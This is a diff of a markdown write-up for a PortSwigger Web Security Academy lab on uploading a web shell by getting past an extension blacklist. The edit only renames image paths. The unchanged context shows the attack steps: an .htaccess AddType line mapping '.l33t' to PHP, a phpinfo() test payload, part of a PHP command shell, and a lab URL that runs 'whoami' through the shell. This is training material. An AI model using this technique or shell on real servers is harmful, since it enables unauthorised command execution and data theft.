@@ -28,8 +28,8 @@ Content-Type: application/octet-stream
 AddType application/x-httpd-php .l33t
 ```
 
-![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/1.png)
-![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/2.png)
+![img](images/Web%20shell%20upload%20via%20extension%20blacklist%20bypass/1.png)
+![img](images/Web%20shell%20upload%20via%20extension%20blacklist%20bypass/2.png)
 
 
 
@@ -43,8 +43,8 @@ Content-Type: application/octet-stream
 <?php phpinfo(); ?>
 ```
 
-![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/3.png)
-![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/4.png)
+![img](images/Web%20shell%20upload%20via%20extension%20blacklist%20bypass/3.png)
+![img](images/Web%20shell%20upload%20via%20extension%20blacklist%20bypass/4.png)
 
 
 Upload cmdshell:
@@ -63,8 +63,8 @@ if($_GET['cmd']) {
 https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/cmd.l33t?cmd=whoami
 ```
 
-![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/5.png)
-![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/6.png)
+![img](images/Web%20shell%20upload%20via%20extension%20blacklist%20bypass/5.png)
+![img](images/Web%20shell%20upload%20via%20extension%20blacklist%20bypass/6.png)
 
 
 Read the file:
@@ -75,5 +75,5 @@ https://0a6000ce04de65cfc3e8c5ac00d700ed.web-security-academy.net/files/avatars/
 
 MzrfsTWgFr82UcKq9wFC0hObV7YSVmlq
 
-![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/7.png)
+![img](images/Web%20shell%20upload%20via%20extension%20blacklist%20bypass/7.png)
 
